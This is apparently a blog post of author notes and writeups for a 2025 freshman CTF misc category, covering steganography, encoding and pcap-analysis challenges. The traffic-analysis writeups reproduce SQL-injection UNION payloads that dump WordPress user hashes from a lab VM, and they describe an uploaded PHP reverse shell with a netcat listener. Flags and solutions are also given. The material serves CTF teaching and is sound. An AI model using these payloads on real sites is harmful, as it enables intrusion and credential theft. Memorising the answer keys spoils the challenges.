---
title: 2025CTF新生赛misc出题笔记
date: 2026-07-01 17:30:52
tags:
  - CTF
categories:
  - 比赛
---
# 2025CTF新生赛misc出题笔记

# **赛题设计说明**

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|retu|20251107|out&in|misc|1|100|

### **[题目场景]:**

word文档隐写

### **[题目描述]：**

dong吃饭去了，ming鬼鬼祟祟地走到他的电脑前，并把他找到的 flag文件重新藏了起来。等到dong回来的时候，ming仰天长笑（捋胡子）道：“我给你留了首诗，就在文档里~”dong赶走了他，回到电脑前，说：“啧啧啧，ming这隐藏技术，新生都找得到，just so so！”

### **[题目考点]：**

word文档隐写+丢丢脑洞

### **[是否原创]：**

是

### **[Flag]:**

`flag{H0ppy_To_g3T_fLa9!}`

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

将文档一些数据颜色调为白色初步隐藏，然后无聊时盯着键盘就想到了连连看，就在键盘上连出了密码，然后利用.docx作为ZIP压缩包的特性，将flag文件打包进了.docx文档中

### **[题目writeup]：**

Ctrl+A全选，发现有隐藏部分（这里根据诗的提示也可以找到猫腻），将字体颜色全调成红色，可以看到三组字符串，根据提示密码为三位数，而且是低头看手下，那么可以看到键盘，分析这三住字符串的组成也能看出，因为它数据的种类横跨了字母、数字和符号，显然就是键盘，那么得到密码AFL，了解.docx的特性的朋友就想到了——改后缀为.zip查看是否有文件隐藏其中，找到flag.zip文件用得到的密码解码就可以得到flag；（这里也可以在010editor中搜索flag字符串，在文件尾前面一点可以发现flag.zip文件，然后就可以知道隐藏了文件了）

### **注意事项**

- 无

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|retu|20251107|easy_wp-1|misc|2|100|

### **[题目场景]:**

流量分析

### **[题目描述]：**

[题目情景纯属虚构，仅供娱乐]

在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出~~坏~~笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗......”。

[注]：流量分析系列题，后面的题都基于本题附件。

本题flag为ming得到的用于登录的用户名和密码，flag格式为flag{username_password}

### **[题目考点]：**

流量分析

### **[是否原创]：**

是

### **[Flag]:**

`flag{GeorgeMiller_q1w2e3}`

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了

### **[题目writeup]：**

过滤http，注意到287,329,349,415的数据包正在进行SQL注入的操作

287包在进行SQL注入尝试

```
<http://192.168.247.135/Hackademic_RTB1/?cat=1>'
```

发现有报错信息返回，返回了数据库的查询语句，后面的几个包是基于这个查询语句在编写注入语句

```
#返回的查询语句
SELECT * FROM wp_categories WHERE cat_ID = 1 \\\' LIMIT 1” Category
```

这里LIMIT 1限制了只返回一行

329包的URL：

```
<http://192.168.247.135/Hackademic_RTB1/?cat=1> union select 1,2,3,4,5
```

由于查询语句中的LIMIT 1只返回一行那么要想`union select 1,2,3,4,5`这个联合查询的语句起效，就只能让`cat_ID`无效

那么就是349包的URL的sql注入,令cat_ID为0使之失效

```
<http://192.168.247.135/Hackademic_RTB1/?cat=0> union select 1,2,3,4,5
```

而且也可以看到349的返回包返回的错误信息中

`\t\t<h3 class="page">Archive for the &#8220;2&#8221; Category</h3>\r\n`，这里显示的是联合查询中第二列的数字2，那么这个第二列可操作就是的点了  
415包是完整的对WordPress数据库的wp-user表的用户ID，用户名，密码和权限等级的查询

```
<http://192.168.247.135/Hackademic_RTB1/?cat=0%20union%20select%201,group_concat(id,0x2d,user_login,0x2d,user_pass,0x2d,user_level),3,4,5%20from%20wp_users>
```

返回的信息

```
1-NickJames-21232f297a57a5a743894a0e4a801fc3-1,2-JohnSmith-b986448f0bb9e5e124ca91d3d650f52c-0,3-GeorgeMiller-7cbb3252ba6b7e9c422fac5334d22054-10,4-TonyBlack-a6e514f9486b83cb53d8d932f9a04292-0,5-JasonKonnors-8601f6e1028a8e8a966f6c33fcd9aec4-0,6-MaxBucky-50484c19f1afdaf3841a0d821ed393d2-0
```

这里肯定是谁的权限大就用谁的密码进行登录，ID为3的用户的权限等级为10，那么显然就是`3-GeorgeMiller-7cbb3252ba6b7e9c422fac5334d22054-10`，密码一看MD5，在线网站进行查询得到q1w2e3

得到flag{GeorgeMiller_q1w2e3}

### **注意事项**

无

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|retu|20251107|easy_wp-2|misc|1|200|

### **[题目场景]:**

流量分析

### **[题目描述]：**

[题目情景纯属虚构，仅供娱乐]

在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出~~坏~~笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗......”。

[注]：流量分析系列题，后面的题都基于本题附件。

本题flag为ming从本机上传的文件名，flag格式为flag{[XXX.XXX](http://XXX.XXX)}

### **[题目考点]：**

流量分析

### **[是否原创]：**

是

### **[Flag]:**

`flag{shell.php}`

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了

### **[题目writeup]：**

这个题有个挖坑点，就是我上传的文件名是shell.php，但是因为之前上传了shell.php，所以这个里名字重复了，文件上传那里它就直接把shell.php给重命名为shell_10.php了，这里如果想省事，在wireshark过滤http直接看的话可能会定位到shell_10.php，就不对了。（~~虽然说这算是个挖坑点，但是感觉也没什么人掉坑里面~~）

可以看到641包，也就是在wp-upload上传了文件的返回包，里面有信息显示The filename 'shell.php' already exists!

那这就说明ming上传给的文件是shell.php

### **注意事项**

- 无

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|retu|20251107|easy_wp-3|misc|2|200|

### **[题目场景]:**

流量分析

### **[题目描述]：**

[题目情景纯属虚构，仅供娱乐]

在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出~~坏~~笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗......”。

[注]：流量分析系列题，后面的题都基于本题附件。

本题flag为ming通过哪个端口对靶机进行监听控制，flag格式为flag{port}

### **[题目考点]：**

流量分析

### **[是否原创]：**

是

### **[Flag]:**

`flag{1234}`

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了

### **[题目writeup]：**

这里攻击者上传了反弹shell下一步肯定就要准备监听控制了，可以找到最后一次访问`http://192.168.247.135/714/Hackademic_RTB1/wp-content/shell_10.php` 的包，直接搜索含shell_10.php的包，在这后面的数据包基本上就会有监听的操作，可以找到714就是访问shell.php的最后一个包
![](/img/posts/2025CTF新生赛misc出题笔记-1782898376020.webp)
在这个包的后面可以看到716包，目标机192.168.247.135主动向攻击机192.168.247.128发起了TCP握手请求，并进行了不规则长度数据传输。再加上（知名端口范围: 0-1023 ）**1234端口**: 不在任何知名服务中注册。那么这里1234端口就是在被监听控制

### **注意事项**

- 无

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|retu|20251107|easy_wp-4|misc|1|200|

### **[题目场景]:**

流量分析

### **[题目描述]：**

[题目情景纯属虚构，仅供娱乐]

在一个满课的夜晚，ming打下了一个靶机，站起身来仰天：“啊哈哈哈哈哈！不要小看我与它的羁绊啊！谁有我快”。在他对面的dong露出~~坏~~笑接下了挑战，ming打靶机一贯喜欢开着wireshark进行抓包事后分析，dong说：你把wireshark给我瞧瞧，我不必吹灰之力就能拿下。在dong看完.pcap后笑道：“桀桀桀，你真的拿下了吗......”。

[注]：流量分析系列题，后面的题都基于本题附件。

本题flag为ming得到的是什么用户的shell，flag格式为flag{XXX}

### **[题目考点]：**

流量分析

### **[是否原创]：**

是

### **[Flag]:**

`flag{apache}`

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

前几天刷靶机刷到了这个，尝试了下for手动扫描ip和端口的操作，考虑到这个操作产生的数据包较少而且是SQL注入的话分析起来较简单，就抓包就作为题目了

### **[题目writeup]：**

这里肯定是在与端口1234交互的情况下，攻击者通过nc监听1234端口，拿到了普通的权限的用户后，一般会进行简单的信息收集比如`ip -a`——查看IP地址是否与目标机符合，`uname -a`——显示系统详细信息，`whoami`——当前用户,`sudo -l`——当前用户的权限。

知道whoami命令的直接查找，723包的data显示whoami
![](Pasted%20image%2020260701173321.png)
不知道的whoami的命令的话，反正数据包也不多，直接在两个IP通过1234端口交互的包的data字段找就行

在这个包往后找肯定就能得到shell的用户身份了

729包中data数据显示是apache
![](/img/posts/2025CTF新生赛misc出题笔记-1782898413430.webp)

### **注意事项**

- 无

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|leed|20251105|何意味？|misc|1|100|

### **[题目场景]:**

### **[题目描述]：**

嗷呜啊~

### **[题目考点]：**

编码转换+base4变种+偏移

就是兽音译者，直接用网上的工具秒解

### **[是否原创]：**

是

### **[Flag]:**

flag{c4e6b3b0-1d5a-4b9f-8c3e-9a0b2f1d7c6a}

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

放一下网上找的源码，编码字符已替换

```
 class HowlingAnimalsTranslator:
     __animalVoice="何意味？"
 
     def __init__(self,newAnimalVoice=None):
         self.setAnimalVoice(newAnimalVoice)
 
     def convert(self,txt=""):
         txt=txt.strip()
         if(txt.__len__()<1):
             return ""
         result=self.__animalVoice[3]+self.__animalVoice[1]+self.__animalVoice[0]
         offset=0
         for t in txt:
             c=ord(t)
             b=12
             while(b>=0):
                 hex=(c>>b)+offset&15
                 offset+=1
                 result+=self.__animalVoice[int(hex>>2)]
                 result+=self.__animalVoice[int(hex&3)]
                 b-=4
         result+=self.__animalVoice[2]
         return result
 
     def deConvert(self,txt):
         txt=txt.strip()
         if(not self.identify(txt)):
             return "Incorrect format!"
         result=""
         i=3
         offset=0
         while(i<txt.__len__()-1):
             c=0
             b=i+8
             while(i<b):
                 n1=self.__animalVoice.index(txt[i])
                 i+=1
                 n2=self.__animalVoice.index(txt[i])
                 c=c<<4|((n1<<2|n2)+offset)&15
                 if(offset==0):
                     offset=0x10000*0x10000-1
                 else:
                     offset-=1
                 i+=1
             result+=chr(c)
         return result
 
     def identify(self,txt):
         if(txt):
             txt=txt.strip()
             if(txt.__len__()>11):
                 if(txt[0]==self.__animalVoice[3] and txt[1]==self.__animalVoice[1] and txt[2]==self.__animalVoice[0] and txt[-1]==self.__animalVoice[2] and ((txt.__len__()-4)%8)==0):
                     for t in txt:
                         if(not self.__animalVoice.__contains__(t)):
                             return False
                     return True
         return False
 
     def setAnimalVoice(self,voiceTxt):
         if(voiceTxt):
             voiceTxt=voiceTxt.strip()
             if(voiceTxt.__len__()==4):
                 self.__animalVoice=voiceTxt
                 return True
         return False
 
     def getAnimalVoice(self):
         return self.__animalVoice
```

### **[题目writeup]：**
![](/img/posts/2025CTF新生赛misc出题笔记-1782898443393.webp)

### **注意事项**

- 无

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|leed|20251017|not_deep|misc|1|100|

### **[题目场景]:**

### **[题目描述]：**

“无言的震颤跨越了光明与黑暗，但真正的秘密，藏在比黑洞更**深邃的（deep）声音**里。”谜语人路过留下这句话就走了。

### **[题目考点]：**

频谱图+deepsound

知道deepsound和会看频谱图秒解；其实不看频谱图也行，电波对上的话听歌识曲，歌曲名的罗马音就是deepsound的密码。

### **[是否原创]：**

是

### **[Flag]:**

flag{Wow_You_find_the_flag}

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

用coagulalight和Audacity在频谱图上加了密码，再用deepsound把flag文件藏在wav中

### **[题目writeup]：**

![](/img/posts/2025CTF新生赛misc出题笔记-1782898463311.webp)

c2F5b25hcmF0ZW5nb2t1bWF0YWtpdGVqaWdva3U=  
base64解码：

sayonaratengokumatakitejigoku

![](/img/posts/2025CTF新生赛misc出题笔记-1782898471683.webp)

输入密钥即可提取

![](/img/posts/2025CTF新生赛misc出题笔记-1782898485240.webp)

### **注意事项**

- 无

### **[题目信息]：**

|**出题人**|**出题时间**|**题目名字**|**题目类型**|**难度等级**|**题目分值**|
|---|---|---|---|---|---|
|leed|20251107|藏到骨子里|misc|1|150|

### **[题目场景]:**

### **[题目描述]：**

期末周的你belike：

### **[题目考点]：**

binwalk分离文件+zip弱口令爆破+hex编码隐写+二维码补全定位角

不binwalk直接从010里面把压缩包找出来也行，二维码有偷偷转个方向

### **[是否原创]：**

是

### **[Flag]:**

flag{bro_is_watching_you}

### **[题目环境]：**

### **[特别注意]：**

无

### **[题目制作过程]：**

第一部分的flag文本转换二维码，把定位角擦掉然后放在gif图里；第二部分flag直接用010藏在编码里，然后压缩。把压缩包和图片合并。

### **[题目writeup]：**

丢进010

![](/img/posts/2025CTF新生赛misc出题笔记-1782898496411.webp)

发现pk头，是zip文件，分离出来，binwalk或者直接把编码提取出来，这里binwalk –e

![](/img/posts/2025CTF新生赛misc出题笔记-1782898506511.webp)

![](/img/posts/2025CTF新生赛misc出题笔记-1782898514412.webp)

有密码，用zip解密工具爆破一下，发现密码是4位数字6499

解密出来是一个gif图

第四张短暂闪过一个二维码的部分，发现不能直接扫描

![](/img/posts/2025CTF新生赛misc出题笔记-1782898520711.webp)

缺的定位角，在网上找个二维码截取一下

用工具补上

![](/img/posts/2025CTF新生赛misc出题笔记-1782898530455.webp)

扫描成功得到第一段

![](/img/posts/2025CTF新生赛misc出题笔记-1782898541241.webp)

再找一下下一段

![](/img/posts/2025CTF新生赛misc出题笔记-1782898549109.webp)

在最后面看到了

flag{bro_is_watching_you}